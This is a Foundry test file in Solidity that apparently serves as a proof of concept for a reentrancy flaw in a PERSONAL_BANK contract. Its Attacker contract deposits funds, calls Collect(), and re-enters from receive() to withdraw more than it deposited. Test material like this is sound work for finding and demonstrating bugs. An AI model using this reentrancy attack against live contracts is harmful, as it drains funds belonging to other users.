
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PERSONAL_BANK} from "../src/PERSONAL_BANK.sol";

contract TestReentrancyPERSONAL_BANK is Test {
    PERSONAL_BANK public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new PERSONAL_BANK();
        _attacker = new Attacker(address(_contractUnderTest));

        // Configure bank so we control the LogFile and initialization
        _contractUnderTest.SetLogFile(address(new LogFileMock()));
        _contractUnderTest.SetMinSum(0.01 ether);
        _contractUnderTest.Initialized();
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 0.01 ether && attackVal < 10 ether);

        // Fund the victim so it has ETH to steal
        vm.deal(address(_contractUnderTest), attackVal * 2);

        // Fund the attacker and this test contract
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // Attacker deposits into the bank
        _attacker.setupAttack{value: attackVal}(attackVal);

        // Snapshot attacker's initial balance
        uint256 attackerInitial = address(_attacker).balance;

        // Trigger the attack
        _attacker.attack(attackVal);

        // Exploit succeeds if attacker drained more than its initial balance
        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
        assertGt(
            address(_attacker).balance,
            attackerInitial,
            "Attacker balance did not increase"
        );
    }

    receive() external payable {}
}

contract Attacker {
    PERSONAL_BANK public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = PERSONAL_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into the bank so we have a balance to withdraw
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // First call to Collect, which will trigger receive() on this contract
        _victim.Collect(val);

        // If we managed to re-enter at least once and increased our balance, mark success
        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter before the victim updates our balance
            _victim.Collect(storedAttackVal);
        }
    }
}

contract LogFileMock {
    function AddMessage(address, uint256, string memory) public {}
}
